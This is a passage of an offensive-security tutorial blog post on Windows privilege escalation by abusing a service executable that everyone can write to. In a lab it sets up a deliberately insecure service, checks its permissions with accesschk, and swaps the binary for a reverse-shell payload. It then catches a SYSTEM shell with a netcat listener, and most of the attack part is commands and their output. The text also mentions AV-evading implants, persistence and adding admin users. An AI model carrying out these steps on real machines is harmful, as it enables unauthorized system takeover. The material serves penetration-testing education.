<li>SERVICE_ENUMERATE_DEPENDENTS</li>
<li>SERVICE_INTERROGATE</li>
<li>SERVICE_QUERY_CONFIG</li>
<li>SERVICE_QUERY_STATUS</li>
<li>SERVICE_USER_DEFINED_CONTROL</li>
<li>READ_CONTROL</li>
</ul>
<p><strong>start_stop</strong></p>
<ul>
<li>SERVICE_ENUMERATE_DEPENDENTS</li>
<li>SERVICE_INTERROGATE</li>
<li>SERVICE_PAUSE_CONTINUE</li>
<li>SERVICE_QUERY_CONFIG</li>
<li>SERVICE_QUERY_STATUS</li>
<li>SERVICE_START</li>
<li>SERVICE_STOP</li>
<li>SERVICE_USER_DEFINED_CONTROL</li>
<li>READ_CONTROL</li>
</ul>
<p><strong>full</strong></p>
<ul>
<li>SERVICE_CHANGE_CONFIG</li>
<li>SERVICE_ENUMERATE_DEPENDENTS</li>
<li>SERVICE_INTERROGATE</li>
<li>SERVICE_PAUSE_CONTINUE</li>
<li>SERVICE_QUERY_CONFIG</li>
<li>SERVICE_QUERY_STATUS</li>
<li>SERVICE_START</li>
<li>SERVICE_STOP</li>
<li>SERVICE_USER_DEFINED_CONTROL</li>
<li>READ_CONTROL</li>
<li>WRITE_OWNER</li>
<li>WRITE_DAC DELETE</li>
</ul>
<h1 id="services-problems-for-the-attacker">Services Problems For The Attacker</h1>
<p>The compromised user must be able to either restart the service or restart the machine to apply the changes made for a particular service. Because of this, we as attackers must enumerate the permissions of the service first and verify if our current compromised user has the <code>SeShutdownPrivilege</code> token enabled. We only need one of these options to abuse services <strong>or</strong> wait for a user to restart the system.</p>
<p>Another important detail to point out is that a group policy can be made to prevent users from restarting or shutting down the system, <a href="http://woshub.com/allow-prevent-non-admin-users-reboot-shutdown-windows/" target="_blank" rel="noopener noreffer ">this article goes into the details</a>.</p>
<h1 id="services-payloads">Services Payloads</h1>
<p>In this article I will be using msfvenom to generate payloads, however, in the real world, we would use implants instead or at least encrypted payloads that can bypass AVs. We don&rsquo;t need to necessarily achieve a reverse shell, we could also add some high-privileged users such as administrators users, add persistence techniques, or do some damage to the system which is NOT recommended.</p>
<h1 id="privilege-escalation-via-insecure-service-executables">Privilege Escalation via Insecure Service Executables</h1>
<p>If the service executable is writable or modifiable we can replace the original service executables with one of our own. Our executable could be an implant, a payload or an encrypted payload. However, we should create a backup of the original executable before replacing it with our executable.</p>
<h2 id="configuration">Configuration</h2>
<p>Open an <strong>administrator</strong> command prompt or a PowerShell console as <strong>administrator</strong> and create the directory that we will use for the service path:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">md </span><span class="s2">&#34;C:\Program Files\Insecure Service Executable&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Copy the service executable file to the path of the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">copy </span><span class="s2">&#34;C:\Users\user\Desktop\VulnService\VulnService\bin\Debug\VulnService.exe&#34;</span> <span class="s2">&#34;C:\Program Files\Insecure Service Executable\VulnService.exe&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="mf">1</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">copied</span><span class="p">.</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Grant full permissions to the executable:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="n">icacls</span> <span class="s2">&#34;C:\Program Files\Insecure Service Executable\VulnService.exe&#34;</span> <span class="p">/</span><span class="n">grant</span> <span class="s2">&#34;Authenticated Users:F&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">processed</span> <span class="n">file</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Insecure</span> <span class="n">Service</span> <span class="n">Executable</span><span class="p">\</span><span class="n">VulnService</span><span class="p">.</span><span class="py">exe</span>
</span></span><span class="line"><span class="cl"><span class="n">Successfully</span> <span class="n">processed</span> <span class="mf">1</span> <span class="n">files</span><span class="p">;</span> <span class="n">Failed</span> <span class="n">processing</span> <span class="mf">0</span> <span class="n">files</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Create the <strong>insecure executable service</strong>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">create</span> <span class="s2">&#34;Insecure VulnService Executable&#34;</span> <span class="n">binpath</span><span class="p">=</span> <span class="s2">&#34;\&#34;</span><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Insecure</span> <span class="n">Service</span> <span class="n">Executable</span><span class="p">\</span><span class="n">VulnService</span><span class="p">.</span><span class="n">exe</span><span class="s2">&#34;\&#34;</span> <span class="n">type</span><span class="p">=</span> <span class="n">own</span> <span class="n">displayname</span><span class="p">=</span> <span class="s2">&#34;Insecure VulnService Executable&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">CreateService</span> <span class="n">SUCCESS</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Note: To create a quoted path we must add &ldquo;\ at the start of the binpath value. Example: &ldquo;&quot;C:\Path To\Executablee&rdquo;&rdquo; or &ldquo;&quot;C:\Path To\Executable&rdquo;&quot;.</p>
<p>If we just add a vlue like &ldquo;C:\Path To\Executable&rdquo; then the service will be unquoted.</p>
</blockquote>
<p>Set the service access rights:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">sdset</span> <span class="s2">&#34;Insecure VulnService Executable&#34;</span> <span class="s2">&#34;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSW;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">SetServiceObjectSecurity</span> <span class="n">SUCCESS</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Start the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">sc start </span><span class="s2">&#34;Insecure VulnService Executable&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">Insecure</span> <span class="n">VulnService</span> <span class="n">Executable</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">STATE</span>              <span class="err">:</span> <span class="mf">2</span>  <span class="n">START_PENDING</span>
</span></span><span class="line"><span class="cl">                                <span class="p">(</span><span class="n">NOT_STOPPABLE</span><span class="p">,</span> <span class="n">NOT_PAUSABLE</span><span class="p">,</span> <span class="n">IGNORES_SHUTDOWN</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">WIN32_EXIT_CODE</span>    <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_EXIT_CODE</span>  <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">CHECKPOINT</span>         <span class="err">:</span> <span class="n">0x0</span>
</span></span><span class="line"><span class="cl">        <span class="n">WAIT_HINT</span>          <span class="err">:</span> <span class="n">0x7d0</span>
</span></span><span class="line"><span class="cl">        <span class="n">PID</span>                <span class="err">:</span> <span class="mf">13036</span>
</span></span><span class="line"><span class="cl">        <span class="n">FLAGS</span>              <span class="err">:</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Notice that the <code>Authenticated Users</code> group has the <code>FILE_ALL_ACCESS</code> permission on the <code>VulnService.exe</code> file. Now let&rsquo;s query the <code>Insecure VulnService Executable</code> service and note that it runs with SYSTEM privileges:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">qc</span> <span class="s2">&#34;Insecure VulnService Executable&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">QueryServiceConfig</span> <span class="n">SUCCESS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">Insecure</span> <span class="n">VulnService</span> <span class="n">Executable</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">START_TYPE</span>         <span class="err">:</span> <span class="mf">3</span>   <span class="n">DEMAND_START</span>
</span></span><span class="line"><span class="cl">        <span class="n">ERROR_CONTROL</span>      <span class="err">:</span> <span class="mf">1</span>   <span class="n">NORMAL</span>
</span></span><span class="line"><span class="cl">        <span class="n">BINARY_PATH_NAME</span>   <span class="err">:</span> <span class="s2">&#34;C:\Program Files\Insecure Service Executable\VulnService.exe&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">LOAD_ORDER_GROUP</span>   <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">TAG</span>                <span class="err">:</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">DISPLAY_NAME</span>       <span class="err">:</span> <span class="n">Insecure</span> <span class="n">VulnService</span> <span class="n">Executable</span>
</span></span><span class="line"><span class="cl">        <span class="n">DEPENDENCIES</span>       <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_START_NAME</span> <span class="err">:</span> <span class="n">LocalSystem</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Using <code>accesschk.exe</code> we can see that the service executable file is writable by everyone from the <code>BINARY_PATH_NAME</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysInternalsSuite</span><span class="p">\</span><span class="n">accesschk</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-quvw</span> <span class="s2">&#34;C:\Program Files\Insecure Service Executable&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Accesschk</span> <span class="n">v6</span><span class="p">.</span><span class="py">14</span> <span class="p">-</span> <span class="n">Reports</span> <span class="n">effective</span> <span class="n">permissions</span> <span class="k">for</span> <span class="n">securable</span> <span class="n">objects</span>
</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="err">⌐</span> <span class="mf">2006</span><span class="p">-</span><span class="mf">2021</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Insecure</span> <span class="n">Service</span> <span class="n">Executable</span><span class="p">\</span><span class="n">VulnService</span><span class="p">.</span><span class="py">exe</span>
</span></span><span class="line"><span class="cl">  <span class="n">Medium</span> <span class="na">Mandatory</span> <span class="n">Level</span> <span class="p">(</span><span class="k">Default</span><span class="p">)</span> <span class="p">[</span><span class="nb">No-Write</span><span class="n">-Up</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span>
</span></span><span class="line"><span class="cl">        <span class="n">FILE_ALL_ACCESS</span>
</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
</span></span><span class="line"><span class="cl">        <span class="n">FILE_ALL_ACCESS</span>
</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>
</span></span><span class="line"><span class="cl">        <span class="n">FILE_ALL_ACCESS</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Verify if we can restart the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysInternalsSuite</span><span class="p">\</span><span class="n">accesschk</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-uvqc</span> <span class="s2">&#34;Insecure VulnService Executable&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Accesschk</span> <span class="n">v6</span><span class="p">.</span><span class="py">14</span> <span class="p">-</span> <span class="n">Reports</span> <span class="n">effective</span> <span class="n">permissions</span> <span class="k">for</span> <span class="n">securable</span> <span class="n">objects</span>
</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="err">⌐</span> <span class="mf">2006</span><span class="p">-</span><span class="mf">2021</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Insecure</span> <span class="n">VulnService</span> <span class="n">Executable</span>
</span></span><span class="line"><span class="cl">  <span class="n">Medium</span> <span class="na">Mandatory</span> <span class="n">Level</span> <span class="p">(</span><span class="k">Default</span><span class="p">)</span> <span class="p">[</span><span class="nb">No-Write</span><span class="n">-Up</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_ALL_ACCESS</span>
</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_ALL_ACCESS</span>
</span></span><span class="line"><span class="cl">  <span class="nb">R </span> <span class="n">Everyone</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_QUERY_STATUS</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_QUERY_CONFIG</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_INTERROGATE</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_ENUMERATE_DEPENDENTS</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_START</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_STOP</span>
</span></span><span class="line"><span class="cl">        <span class="n">READ_CONTROL</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Create a backup of the original executable:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="nb">copy </span><span class="s2">&#34;C:\Program Files\Insecure Service Executable\VulnService.exe&#34;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Temp</span>
</span></span><span class="line"><span class="cl"><span class="n">Overwrite</span> <span class="n">C:</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">VulnService</span><span class="p">.</span><span class="n">exe</span><span class="p">?</span> <span class="p">(</span><span class="n">Yes</span><span class="p">/</span><span class="n">No</span><span class="p">/</span><span class="n">All</span><span class="p">)</span><span class="err">:</span> <span class="n">Yes</span>
</span></span><span class="line"><span class="cl">        <span class="mf">1</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">copied</span><span class="p">.</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Stop the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">stop</span> <span class="s2">&#34;Insecure VulnService Executable&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">Insecure</span> <span class="n">VulnService</span> <span class="n">Executable</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">STATE</span>              <span class="err">:</span> <span class="mf">3</span>  <span class="n">STOP_PENDING</span>
</span></span><span class="line"><span class="cl">                                <span class="p">(</span><span class="n">STOPPABLE</span><span class="p">,</span> <span class="n">NOT_PAUSABLE</span><span class="p">,</span> <span class="n">ACCEPTS_SHUTDOWN</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">WIN32_EXIT_CODE</span>    <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_EXIT_CODE</span>  <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">CHECKPOINT</span>         <span class="err">:</span> <span class="n">0x0</span>
</span></span><span class="line"><span class="cl">        <span class="n">WAIT_HINT</span>          <span class="err">:</span> <span class="n">0x0</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Copy the <code>reverse.exe</code> executable you created and replace the <code>VulnService.exe</code> with it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="nb">copy </span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">reverse</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;C:\Program Files\Insecure Service Executable\VulnService.exe&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">Overwrite</span> <span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Insecure</span> <span class="n">Service</span> <span class="n">Executable</span><span class="p">\</span><span class="n">VulnService</span><span class="p">.</span><span class="n">exe</span><span class="p">?</span> <span class="p">(</span><span class="n">Yes</span><span class="p">/</span><span class="n">No</span><span class="p">/</span><span class="n">All</span><span class="p">)</span><span class="err">:</span> <span class="n">Yes</span>
</span></span><span class="line"><span class="cl">        <span class="mf">1</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">copied</span><span class="p">.</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then in the attacker host, we&rsquo;ll set up a <code>nc</code> listener:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp <span class="m">443</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">net</span> <span class="nb">start </span><span class="s2">&#34;Insecure VulnService Executable&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c"># IT HANGS HERE</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We have escalated privileges to <code>NT AUTHORITY\SYSTEM</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">nc</span> <span class="n">-lvnp</span> <span class="mf">443</span>
</span></span><span class="line"><span class="cl"><span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="no">any</span><span class="p">]</span> <span class="mf">443</span> <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">192.168</span><span class="p">.</span><span class="py">27</span><span class="p">.</span><span class="mf">128</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">192.168</span><span class="p">.</span><span class="py">27</span><span class="p">.</span><span class="mf">129</span><span class="p">]</span> <span class="mf">50997</span>
</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="no">Version 10.0.22000.493</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
</span></span><span class="line"><span class="cl"><span class="n">whoami</span> <span class="p">/</span><span class="n">all</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">USER</span> <span class="n">INFORMATION</span>
</span></span><span class="line"><span class="cl"><span class="p">----------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">User</span> <span class="n">Name</span>           <span class="n">SID</span>
</span></span><span class="line"><span class="cl"><span class="p">===================</span> <span class="p">========</span>
</span></span><span class="line"><span class="cl"><span class="n">nt</span> <span class="n">authority</span><span class="p">\</span><span class="n">system</span> <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">18</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">GROUP </span><span class="n">INFORMATION</span>
</span></span><span class="line"><span class="cl"><span class="p">-----------------</span>
</span></span><span class="line"><span class="cl">
